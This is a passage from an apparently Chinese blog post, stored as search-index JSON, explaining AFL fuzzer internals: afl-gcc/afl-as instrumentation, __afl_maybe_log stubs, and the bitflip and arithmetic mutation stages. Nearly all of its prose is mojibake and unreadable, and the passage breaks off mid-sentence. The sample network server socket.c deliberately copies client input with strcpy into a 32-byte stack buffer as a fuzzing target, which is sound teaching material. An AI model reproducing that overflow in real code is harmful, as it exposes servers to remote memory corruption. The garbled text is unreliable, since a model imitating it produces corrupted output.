è¦†ç›–ç‡è®¡ç®—æ–¹å¼ï¼Œæœ‰æºç çš„æƒ…å†µä¸‹ï¼Œåœ¨æºä»£ç ç¼–è¯‘æ—¶è¿›è¡Œæ’æ¡©ï¼Œæ— æºç çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨QEMUè¿›è¡ŒäºŒè¿›åˆ¶æ’æ¡©ã€‚ä¸‹ä¸€ç« èŠ‚ä¼šåˆ†åˆ«è¯¦ç»†è®²è§£è¿™ä¸¤ç§æƒ…å†µä½¿ç”¨çš„æ’æ¡©æŠ€æœ¯ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"äºŒã€æ’æ¡© ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"1. æœ‰æºç  æˆ‘ä»¬ä»¥å¦‚ä¸‹ä»£ç ä¸ºä¾‹è¿›è¡Œè¯´æ˜ï¼Œæ–‡ä»¶åä¸º socket.c #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } å¯ä»¥è¿›è¡Œæºç æ’æ¡©çš„æŒ‡ä»¤æœ‰ afl-gccã€afl-g++ã€afl-clangã€afl-clang++ ( afl-clang-fast å’Œ afl-clang-fast++ æš‚ä¸è®¨è®º)ï¼Œé€šè¿‡æŸ¥çœ‹è¿™äº›æ–‡ä»¶çš„å…·ä½“å±æ€§ï¼Œå¯ä»¥å‘ç°åä¸‰è€…éƒ½æ˜¯ afl-gcc çš„è½¯é“¾æ¥ï¼Œå…¶å®éƒ½æ˜¯åŒä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼š é€šè¿‡åˆ†æ afl-gcc.c ä¸­çš„ä»£ç å¯ä»¥å‘ç°ï¼Œ afl-gcc å°±æ˜¯åœ¨åŸæœ‰çš„ç¼–è¯‘æŒ‡ä»¤ä¸Šå¢åŠ ä¸€äº›ç¼–è¯‘é€‰é¡¹ç„¶åè°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼š ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹æ¯æ¬¡æºç ç¼–è¯‘æ—¶çš„ç¼–è¯‘é€‰é¡¹ï¼Œå¯ä»¥å¯¹ afl-gcc.c è¿›è¡Œä¿®æ”¹ï¼Œåœ¨ main() å‡½æ•°ä¸­è°ƒç”¨ execvp() ä¹‹å‰æ·»åŠ å¦‚ä¸‹ä»£ç ï¼Œæ‰“å°å‡ºå®é™…æ‰§è¡Œçš„ç¼–è¯‘æŒ‡ä»¤ï¼š //print command for(int i = 0; i \u003c cc_par_cnt; i++){ printf(\"%s \", cc_params[i]); } printf(\"\\n\"); å…¶ä¸­æ•°ç»„ cc_params å­˜æ”¾ç€ç¼–è¯‘æŒ‡ä»¤å’Œé€‰é¡¹ï¼Œæ•´æ•° cc_par_cnt å­˜æ”¾æ•°ç»„æœ‰æ•ˆå€¼ï¼Œä¿®æ”¹å®Œæˆåå¯¹AFLé‡æ–°è¿›è¡Œç¼–è¯‘å³å¯ã€‚ ï¼ˆafl-clang-fast å’Œ afl-clang-fast++ å¯¹åº”çš„æºç æ–‡ä»¶ä¸º llvm_mode/afl-clang-fast.c ï¼Œä¿®æ”¹æ–¹æ³•ç›¸åŒï¼‰ ä½¿ç”¨ afl-gcc å¯¹ä¸Šé¢ä»£ç è¿›è¡Œç¼–è¯‘ afl-gcc -o socket_afl socket.c å¯ä»¥çœ‹åˆ°å®é™…æ‰§è¡Œçš„ç¼–è¯‘æŒ‡ä»¤ä¸º gcc -o socket socket.c -B /usr/local/lib/afl -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ï¼Œå…¶ä¸­ -B \u003cdirectory\u003e é€‰é¡¹ç”¨äºå°†æ·»åŠ åˆ°ç¼–è¯‘å™¨çš„æœç´¢è·¯å¾„ï¼Œ-g é€‰é¡¹ç”Ÿæˆè°ƒè¯•ä¿¡æ¯ï¼Œ-O3 ä¼˜åŒ–ç”Ÿæˆä»£ç ï¼Œ-funroll-loops é€‰é¡¹å±•å¼€å¾ªç¯çš„è¿­ä»£æ¬¡æ•°å¯ä»¥åœ¨ç¼–è¯‘æ—¶æˆ–è¿›å…¥å¾ªç¯æ—¶ç¡®å®šï¼Œå‰©ä½™ä¸¤ä¸ªä¸ºAFLä½¿ç”¨çš„é€‰é¡¹ã€‚ï¼ˆgccçš„é€‰é¡¹å¯ä»¥å‚è€ƒæ­¤é“¾æ¥ https://gcc.gnu.org/onlinedocs/gcc-4.4.2/gcc/Optimize-Options.htmlï¼‰ å¦‚æœäº†è§£ç¼–è¯‘è¿‡ç¨‹ï¼Œé‚£ä¹ˆå°±çŸ¥é“æŠŠæºä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶ï¼Œä¸»è¦æ˜¯ç»è¿‡â€æºä»£ç â€-\u003eâ€æ±‡ç¼–ä»£ç â€-\u003eâ€äºŒè¿›åˆ¶â€è¿™æ ·çš„è¿‡ç¨‹ã€‚è€Œå°†æ±‡ç¼–ä»£ç ç¼–è¯‘æˆä¸ºäºŒè¿›åˆ¶çš„å·¥å…·ï¼Œå³ä¸ºæ±‡ç¼–å™¨assemblerã€‚Linuxç³»ç»Ÿä¸‹çš„å¸¸ç”¨æ±‡ç¼–å™¨æ˜¯asã€‚ä¸è¿‡ï¼Œç¼–è¯‘å®ŒæˆAFLåï¼Œåœ¨å…¶ç›®å½•ä¸‹ä¹Ÿä¼šå­˜åœ¨ä¸€ä¸ªasæ–‡ä»¶ï¼Œå¹¶ä½œä¸ºç¬¦å·é“¾æ¥æŒ‡å‘afl-asã€‚æ‰€ä»¥ï¼Œå¦‚æœé€šè¿‡-Bé€‰é¡¹ä¸ºgccè®¾ç½®äº†æœç´¢è·¯å¾„ï¼Œé‚£ä¹ˆafl-asä¾¿ä¼šä½œä¸ºæ±‡ç¼–å™¨ï¼Œæ‰§è¡Œå®é™…çš„æ±‡ç¼–æ“ä½œã€‚ æ‰€ä»¥ï¼ŒAFLçš„ä»£ç æ’æ¡©ï¼Œå°±æ˜¯åœ¨å°†æºæ–‡ä»¶ç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç åï¼Œé€šè¿‡ afl-as å®Œæˆã€‚ afl-as ä¸‹é¢é€šè¿‡å¯¹æ¯” gcc å’Œ afl-gcc çš„ç¼–è¯‘ç»“æœè¿›è¡Œå¤§è‡´åˆ†æã€‚ å°† afl-gcc ä¸­æ·»åŠ çš„ -Bã€-D__AFL_COMPILER=1ã€DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ä¸‰ä¸ªé€‰é¡¹å»æ‰ï¼Œè°ƒç”¨ gcc gcc -o socket socket.c -g -O3 -funroll-loops è¿™æ ·å°±ç”Ÿæˆäº† socket_afl å’Œ socket ä¸¤ä¸ªæ–‡ä»¶ã€‚ ä½¿ç”¨ bindiff å¯¹è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„ main å‡½æ•°è¿›è¡Œå¯¹æ¯” ä¸Šå›¾ä¸­å³ä¸‹è§’éƒ¨åˆ†çœ‹èµ·æ¥ç»“æ„ä¸ä¸€æ ·ï¼Œä¸è¿‡è¿™é‡Œæ˜¯ bindiff è¯†åˆ«bugï¼Œå¤šå‡ºäº†ä¸€ä¸ªä»£ç å—å¹¶ä¸”å°‘äº†ä¸€æ¡çº¿ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†åˆ«ä½¿ç”¨ ida æ‰“å¼€è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹ main å‡½æ•°çš„ç»“æ„å›¾ è¿™é‡Œå¯¹ bindiff è¯¯æŠ¥ç»“æœçš„è¯¦ç»†åˆ†æå°±ä¸å¤šè¯´äº†ï¼Œè¿™ä¸ªä¸æ˜¯æœ¬æ¬¡çš„é‡ç‚¹ã€‚ å¯ä»¥çœ‹åˆ° afl è¿›è¡Œæºä»£ç æ’æ¡©æ—¶ä¸ä¼šæ”¹å˜ä»£ç çš„é€»è¾‘ç»“æ„ï¼Œä¹Ÿä¸ä¼šå¢åŠ æˆ–å‡å°‘ä»£ç å—ã€‚ å¯¹æ¯”çœ‹ä¸‹æ¯ä¸ªä»£ç å—ä¸­ä»£ç çš„åŒºåˆ« å¯ä»¥çœ‹å‡ºï¼ŒåŸºæœ¬æ¯ä¸ªä»£ç å—éƒ½è¢«æ·»åŠ äº†ä¸€æ®µç›¸ä¼¼çš„æ±‡ç¼–ä»£ç  åœ¨ ida ä¸­å°†è¿™éƒ¨åˆ†ä»£ç æ‹·è´å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼š lea rsp, [rsp-98h] mov [rsp+1D0h+var_1D0], rdx mov [rsp+1D0h+var_1C8], rcx mov [rsp+1D0h+var_1C0], n mov rcx, 650Eh call __afl_maybe_log mov n, [rsp+1D0h+var_1C0] mov rcx, [rsp+1D0h+var_1C8] mov rdx, [rsp+1D0h+var_1D0] lea rsp, [rsp+98h] å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œä¸åŒçš„ä»£ç å—åªæœ‰ mov rcx, 650Eh è¿™æ¡æ±‡ç¼–ä»£ç å‘ rcx å­˜æ”¾çš„å€¼ä¸åŒï¼Œè¿™ä¸ªå°±æ˜¯éšæœºç”Ÿæˆçš„æ ‡è¯†ä»£ç å—çš„idï¼Œå½“è¿è¡Œåˆ°è¿™éƒ¨åˆ†æ±‡ç¼–æ—¶ afl å°±çŸ¥é“æ˜¯å“ªä¸ªä»£ç å—è¢«æ‰§è¡Œäº†ã€‚ ä¸Šè¿° ida ä¸­çš„æ±‡ç¼–ä»£ç åŸå‹å¯ä»¥åœ¨ afl-as.h ä¸­æ‰¾åˆ°ï¼ˆä»¥64ä½ä»£ç ä¸ºä¾‹ï¼‰ï¼š ä¸Šè¿°ä»£ç æ‰§è¡Œçš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š ä¿å­˜ rdxã€ rcx ã€rax å¯„å­˜å™¨ å°† rcx çš„å€¼è®¾ç½®ä¸º fprintf() å‡½æ•°å°†è¦æ‰“å°çš„å˜é‡å†…å®¹ è°ƒç”¨ __afl_maybe_log å‡½æ•° æ¢å¤å¯„å­˜å™¨ åœ¨ä»¥ä¸Šçš„åŠŸèƒ½ä¸­ï¼Œ __afl_maybe_log æ˜¯æ’æ¡©ä»£ç æ‰€æ‰§è¡Œçš„å®é™…å†…å®¹ï¼Œåç»­å°†è¯¦ç»†å±•å¼€ã€‚ å¯ä»¥åœ¨ afl-as.c ä¸­æŸ¥çœ‹åˆ°è¯¥æ±‡ç¼–çš„è°ƒç”¨ï¼Œé€šè¿‡ fprintf() å‡½æ•°çš„è°ƒç”¨ï¼Œå°†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ·»åŠ åˆ°æ±‡ç¼–æ–‡ä»¶çš„ç›¸åº”ä½ç½®ã€‚ è¿™é‡Œåˆ†æä¸‹ R(MAP_SIZE) ï¼Œå®ƒå°±æ˜¯ä¸Šé¢æ±‡ç¼–ä»£ç ä¸­å°† rcx è®¾ç½®çš„å€¼ã€‚æ ¹æ®å®šä¹‰ï¼Œ MAP_SIZE ä¸º64Kï¼Œè€Œå¯¹äº R(x) å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š å…¶ä¸­ R(MAP_SIZE) ç›¸å½“äº random() % (1 \u003c\u003c MAP_SIZE_POW2) ï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆéšæœºæ•°ï¼Œæ‰€ä»¥æ ‡è¯†ä»£ç å—çš„idæ˜¯éšæœºç”Ÿæˆçš„ï¼ˆä¸¤æ¬¡ç¼–è¯‘ç”Ÿæˆçš„ä»£ç æ®µidä¸åŒï¼‰ã€‚ ä¸Šè¿°è¿‡ç¨‹æ€»ç»“èµ·æ¥å°±æ˜¯åœ¨å¤„ç†åˆ°æŸä¸ªåˆ†æ”¯éœ€è¦æ’å…¥æ¡©ä»£ç æ—¶ï¼Œ afl-as ä¼šéšæœºç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºè¿è¡Œæ—¶ä¿å­˜åœ¨ rcx ä¸­çš„å€¼ã€‚è€Œè¿™ä¸ªéšæœºæ•°ï¼Œä¾¿æ˜¯ç”¨äºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„idã€‚ ï¼ˆå¤‡æ³¨ï¼šå› ä¸ºä»£ç å—IDéšæœºçš„é—®é¢˜ï¼Œä¼š","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"2. æ— æºç  æ— æºç æƒ…å†µä¸‹ï¼ŒAFLä½¿ç”¨QEMUè¿›è¡ŒäºŒè¿›åˆ¶æ’æ¡©ï¼Œå…·ä½“æ’æ¡©åŸç†å¾…è¡¥å……ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"ä¸‰ã€å˜å¼‚ç­–ç•¥ AFLç»´æŠ¤äº†ä¸€ä¸ªé˜Ÿåˆ—(queue)ï¼Œæ¯æ¬¡ä»è¿™ä¸ªé˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹å…¶è¿›è¡Œå¤§é‡å˜å¼‚ï¼Œå¹¶æ£€æŸ¥è¿è¡Œåæ˜¯å¦ä¼šå¼•èµ·ç›®æ ‡å´©æºƒã€å‘ç°æ–°è·¯å¾„ç­‰ç»“æœã€‚å˜å¼‚çš„ä¸»è¦ç±»å‹å¦‚ä¸‹ï¼š bitflipï¼ŒæŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1 arithmeticï¼Œæ•´æ•°åŠ /å‡ç®—æœ¯è¿ç®— interestï¼ŒæŠŠä¸€äº›ç‰¹æ®Šå†…å®¹æ›¿æ¢åˆ°åŸæ–‡ä»¶ä¸­ dictionaryï¼ŒæŠŠè‡ªåŠ¨ç”Ÿæˆæˆ–ç”¨æˆ·æä¾›çš„tokenæ›¿æ¢/æ’å…¥åˆ°åŸæ–‡ä»¶ä¸­ havocï¼Œä¸­æ–‡æ„æ€æ˜¯â€œå¤§ç ´åâ€ï¼Œæ­¤é˜¶æ®µä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå¤§é‡å˜å¼‚ spliceï¼Œä¸­æ–‡æ„æ€æ˜¯â€œæ‹¼æ¥â€ï¼Œæ­¤é˜¶æ®µä¼šå°†ä¸¤ä¸ªæ–‡ä»¶æ‹¼æ¥èµ·æ¥å¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ å…¶ä¸­ï¼Œå‰å››é¡¹ bitflip, arithmetic, interest, dictionary æ˜¯é dumb modeï¼ˆ-dï¼‰å’Œä¸» fuzzerï¼ˆ-Mï¼‰ä¼šè¿›è¡Œçš„æ“ä½œï¼Œç”±äºå…¶å˜å¼‚æ–¹å¼æ²¡æœ‰éšæœºæ€§ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸º deterministic fuzzing ï¼›havoc å’Œ splice åˆ™å­˜åœ¨éšæœºæ€§ï¼Œæ˜¯æ‰€æœ‰çŠ¶å†µçš„ fuzzerï¼ˆæ˜¯å¦ dumb modeã€ä¸»ä» fuzzerï¼‰éƒ½ä¼šæ‰§è¡Œçš„å˜å¼‚ã€‚ ä»¥ä¸‹å°†å¯¹è¿™äº›å˜å¼‚ç±»å‹è¿›è¡Œå…·ä½“ä»‹ç»ã€‚ ###ï¼ˆ1ï¼‰ bitflip æ‹¿åˆ°ä¸€ä¸ªåŸå§‹æ–‡ä»¶ï¼Œé¦–å…ˆè¿›è¡Œçš„å°±æ˜¯bitflipï¼Œè€Œä¸”è¿˜ä¼šæ ¹æ®ç¿»è½¬é‡/æ­¥é•¿è¿›è¡Œå¤šç§ä¸åŒçš„ç¿»è½¬ï¼ŒæŒ‰ç…§é¡ºåºä¾æ¬¡ä¸ºï¼š bitflip 1/1ï¼Œ æ¯æ¬¡ç¿»è½¬1ä¸ªbitï¼ŒæŒ‰ç…§æ¯1ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ bitflip 2/1ï¼Œ æ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„2ä¸ªbitï¼ŒæŒ‰ç…§æ¯1ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ bitflip 4/1ï¼Œ æ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„4ä¸ªbitï¼ŒæŒ‰ç…§æ¯1ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ bitflip 8/8ï¼Œ æ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„8ä¸ªbitï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³ä¾æ¬¡å¯¹æ¯ä¸ªbyteåšç¿»è½¬ bitflip 16/8ï¼Œæ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„16ä¸ªbitï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³ä¾æ¬¡å¯¹æ¯ä¸ªwordåšç¿»è½¬ bitflip 32/8ï¼Œæ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„32ä¸ªbitï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³ä¾æ¬¡å¯¹æ¯ä¸ªdwordåšç¿»è½¬ åœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼ŒAFLå·§å¦™åœ°åµŒå…¥äº†ä¸€äº›å¯¹æ–‡ä»¶æ ¼å¼çš„å¯å‘å¼åˆ¤æ–­ï¼Œä»¥å›¾å°½å¯èƒ½å¤šå¾—è·å–æ–‡ä»¶ä¿¡æ¯ã€‚ è‡ªåŠ¨æ£€æµ‹token åœ¨è¿›è¡Œ bitflip 1/1å˜å¼‚æ—¶ï¼Œå¯¹äºæ¯ä¸ª byte çš„æœ€ä½ä½( least significant bit )ç¿»è½¬è¿˜è¿›è¡Œäº†é¢å¤–çš„å¤„ç†ï¼šå¦‚æœè¿ç»­å¤šä¸ª bytes çš„æœ€ä½ä½è¢«ç¿»è½¬åï¼Œç¨‹åºçš„æ‰§è¡Œè·¯å¾„éƒ½æœªå˜åŒ–ï¼Œè€Œä¸”ä¸åŸå§‹æ‰§è¡Œè·¯å¾„ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆå°±æŠŠè¿™ä¸€æ®µè¿ç»­çš„ bytes åˆ¤æ–­æ˜¯ä¸€æ¡tokenã€‚ ä¾‹å¦‚ï¼ŒPNGæ–‡ä»¶ä¸­ç”¨IHDRä½œä¸ºèµ·å§‹å—çš„æ ‡è¯†ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ç±»ä¼¼äºä»¥ä¸‹çš„å†…å®¹ï¼š ........IHDR........ å½“ç¿»è½¬åˆ°å­—ç¬¦Içš„æœ€é«˜ä½æ—¶ï¼Œå› ä¸ºIHDRè¢«ç ´åï¼Œæ­¤æ—¶ç¨‹åºçš„æ‰§è¡Œè·¯å¾„è‚¯å®šä¸å¤„ç†æ­£å¸¸æ–‡ä»¶çš„è·¯å¾„æ˜¯ä¸åŒçš„ï¼›éšåï¼Œåœ¨ç¿»è½¬æ¥ä¸‹æ¥3ä¸ªå­—ç¬¦çš„æœ€é«˜ä½æ—¶ï¼ŒIHDRæ ‡è¯†åŒæ ·è¢«ç ´åï¼Œç¨‹åºåº”è¯¥ä¼šé‡‡å–åŒæ ·çš„æ‰§è¡Œè·¯å¾„ã€‚ç”±æ­¤ï¼ŒAFLå°±åˆ¤æ–­å¾—åˆ°ä¸€ä¸ªå¯èƒ½çš„tokenï¼šIHDRï¼Œå¹¶å°†å…¶è®°å½•ä¸‹æ¥ä¸ºåé¢çš„å˜å¼‚æä¾›å¤‡é€‰ã€‚ AFLé‡‡å–çš„è¿™ç§æ–¹å¼æ˜¯éå¸¸å·§å¦™çš„ï¼šå°±æœ¬è´¨è€Œè¨€ï¼Œè¿™å®é™…ä¸Šæ˜¯å¯¹æ¯ä¸ªbyteè¿›è¡Œä¿®æ”¹å¹¶æ£€æŸ¥æ‰§è¡Œè·¯å¾„ï¼›ä½†é›†æˆåˆ°bitflipåï¼Œå°±ä¸éœ€è¦å†æµªè´¹é¢å¤–çš„æ‰§è¡Œèµ„æºäº†ã€‚æ­¤å¤–ï¼Œä¸ºäº†æ§åˆ¶è¿™æ ·è‡ªåŠ¨ç”Ÿæˆçš„tokençš„å¤§å°å’Œæ•°é‡ï¼ŒAFLè¿˜åœ¨config.hä¸­é€šè¿‡å®å®šä¹‰äº†é™åˆ¶ï¼š /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) å¯¹äºä¸€äº›æ–‡ä»¶æ¥è¯´ï¼Œæˆ‘ä»¬å·²çŸ¥å…¶æ ¼å¼ä¸­å‡ºç°çš„tokené•¿åº¦ä¸ä¼šè¶…è¿‡4ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ MAX_AUTO_EXTRA ä¸º4å¹¶é‡æ–°ç¼–è¯‘AFLï¼Œä»¥æ’é™¤ä¸€äº›æ˜æ˜¾ä¸ä¼šæ˜¯tokençš„æƒ…å†µã€‚é—æ†¾çš„æ˜¯ï¼Œè¿™äº›è®¾ç½®æ˜¯é€šè¿‡å®å®šä¹‰æ¥å®ç°ï¼Œæ‰€ä»¥ä¸èƒ½åšåˆ°è¿è¡Œæ—¶æŒ‡å®šï¼Œæ¯æ¬¡ä¿®æ”¹åå¿…é¡»é‡æ–°ç¼–è¯‘AFLã€‚ ç”Ÿæˆeffector map åœ¨è¿›è¡Œbitflip 8/8å˜å¼‚æ—¶ï¼ŒAFLè¿˜ç”Ÿæˆäº†ä¸€ä¸ªéå¸¸é‡è¦çš„ä¿¡æ¯ï¼šeffector mapã€‚è¿™ä¸ªeffector mapå‡ ä¹è´¯ç©¿äº†æ•´ä¸ªdeterministic fuzzingçš„å§‹ç»ˆã€‚ å…·ä½“åœ°ï¼Œåœ¨å¯¹æ¯ä¸ªbyteè¿›è¡Œç¿»è½¬æ—¶ï¼Œå¦‚æœå…¶é€ æˆæ‰§è¡Œè·¯å¾„ä¸åŸå§‹è·¯å¾„ä¸ä¸€è‡´ï¼Œå°±å°†è¯¥byteåœ¨effector mapä¸­æ ‡è®°ä¸º1ï¼Œå³â€œæœ‰æ•ˆâ€çš„ï¼Œå¦åˆ™æ ‡è®°ä¸º0ï¼Œå³â€œæ— æ•ˆâ€çš„ã€‚ è¿™æ ·åšçš„é€»è¾‘æ˜¯ï¼šå¦‚æœä¸€ä¸ªbyteå®Œå…¨ç¿»è½¬ï¼Œéƒ½æ— æ³•å¸¦æ¥æ‰§è¡Œè·¯å¾„çš„å˜åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªbyteå¾ˆæœ‰å¯èƒ½æ˜¯å±äºâ€dataâ€ï¼Œè€Œéâ€metadataâ€ï¼ˆä¾‹å¦‚size, flagç­‰ï¼‰ï¼Œå¯¹æ•´ä¸ªfuzzingçš„æ„ä¹‰ä¸å¤§ã€‚æ‰€ä»¥ï¼Œåœ¨éšåçš„ä¸€äº›å˜å¼‚ä¸­ï¼Œä¼šå‚è€ƒeffector mapï¼Œè·³è¿‡é‚£äº›â€œæ— æ•ˆâ€çš„byteï¼Œä»è€ŒèŠ‚çœäº†æ‰§è¡Œèµ„æºã€‚ ç”±æ­¤ï¼Œé€šè¿‡æå°çš„å¼€é”€ï¼ˆæ²¡æœ‰å¢åŠ é¢å¤–çš„æ‰§è¡Œæ¬¡æ•°ï¼‰ï¼ŒAFLåˆä¸€æ¬¡å¯¹æ–‡ä»¶æ ¼å¼è¿›è¡Œäº†å¯å‘å¼çš„åˆ¤æ–­ã€‚çœ‹åˆ°è¿™é‡Œï¼Œä¸å¾—ä¸å¹æœäºAFLå®ç°ä¸Šçš„ç²¾å¦™ã€‚ ä¸è¿‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¹¶ä¸ä¼šæ£€æµ‹æœ‰æ•ˆå­—ç¬¦ã€‚ç¬¬ä¸€ç§æƒ…å†µå°±æ˜¯dumb modeæˆ–è€…ä»fuzzerï¼Œæ­¤æ—¶æ–‡ä»¶æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å¯èƒ½è¢«å˜å¼‚ã€‚ç¬¬äºŒã€ç¬¬ä¸‰ç§æƒ…å†µä¸æ–‡ä»¶æœ¬èº«æœ‰å…³ï¼š /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 å³é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ–‡ä»¶å°äº128 bytesï¼Œé‚£ä¹ˆæ‰€æœ‰å­—ç¬¦éƒ½æ˜¯â€œæœ‰æ•ˆâ€çš„ï¼›åŒæ ·åœ°ï¼Œå¦‚æœAFLå‘ç°ä¸€ä¸ªæ–‡ä»¶æœ‰è¶…è¿‡90%çš„byteséƒ½æ˜¯â€œæœ‰æ•ˆâ€çš„ï¼Œé‚£ä¹ˆä¹Ÿä¸å·®é‚£10%äº†ï¼Œå¤§ç¬”ä¸€æŒ¥ï¼Œå¹²è„†æŠŠæ‰€æœ‰å­—ç¬¦éƒ½åˆ’å½’ä¸ºâ€œæœ‰æ•ˆâ€ã€‚ ###ï¼ˆ2ï¼‰ arithmetic åœ¨bitflipå˜å¼‚å…¨éƒ¨è¿›è¡Œå®Œæˆåï¼Œä¾¿è¿›å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µï¼šarithmeticã€‚ä¸bitflipç±»ä¼¼çš„æ˜¯ï¼Œarithmeticæ ¹æ®ç›®æ ‡å¤§å°çš„ä¸åŒï¼Œä¹Ÿåˆ†ä¸ºäº†å¤šä¸ªå­é˜¶æ®µï¼š arith 8/8ï¼Œæ¯æ¬¡å¯¹8ä¸ªbitè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªbyteè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ arith 16/8ï¼Œæ¯æ¬¡å¯¹16ä¸ªbitè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªwordè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ arith 